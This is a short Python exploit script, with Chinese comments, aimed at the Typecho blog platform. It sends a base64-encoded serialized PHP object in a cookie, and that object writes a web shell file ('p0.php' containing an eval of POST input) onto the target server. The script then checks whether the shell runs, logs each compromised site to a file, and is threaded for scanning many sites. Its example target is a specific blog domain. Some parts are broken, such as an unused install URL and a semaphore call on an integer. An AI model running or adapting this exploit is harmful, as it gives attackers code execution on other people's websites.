# /usr/bin/env python
# -*- coding: UTF-8 -*-
import requests as s

import threading


class check(threading.Thread):
    def __init__(self, url, sem):
        super(check, self).__init__()  # 继承threading类的构造方法，python3的写法super().__init__()
        self.url = url
        self.sem = sem

    def run(self):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0',
            'Referer': self.url,
            'cookie': "__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ=="
        }
        try:
            reqs = s.get(self.url, timeout=3, headers=headers, allow_redirects=False)
            # print(reqs.status_code),
        except IOError:  # 如果网站打不开将输出fail
            print("time out 1")
        urls = self.url + "/p0.php"
        urlsss = self.url + "/install.php?finish=1"
        payloads = {'p0': 'echo "sectest";'}
        try:
            reqss = s.post(urls, allow_redirects=False, timeout=3, data=payloads)  # 测试是否文件创建成功
            body = reqss.text
            if body.find('sectest') != -1:
                print("web is success----->>>>>>" + self.url)
                with open("./success.txt", "a+") as f1:
                    f1.write(self.url + "\n")
            else:
                print("web is fail-------->>>>>>" + self.url)
            print('\n')
        except IOError:  # 如果网站打不开将输出fail
            print("time out 2")
        self.sem.release()


if __name__ == '__main__':
    check('https://blog.hc26.top/', 1)
